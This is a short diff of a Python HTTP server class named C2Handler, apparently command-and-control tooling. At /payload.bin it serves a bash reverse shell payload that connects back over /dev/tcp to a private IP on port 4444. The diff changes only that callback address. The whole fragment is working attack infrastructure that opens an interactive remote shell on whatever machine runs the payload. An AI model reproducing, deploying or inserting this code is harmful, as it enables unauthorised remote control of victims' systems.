@@ -14,7 +14,7 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path == '/payload.bin':
             # Serve a reverse shell payload
             payload = b"""#!/bin/bash
-bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &
+bash -i >& /dev/tcp/192.168.1.151/4444 0>&1 &
 """
             self.send_response(200)
             self.send_header('Content-type', 'application/octet-stream')
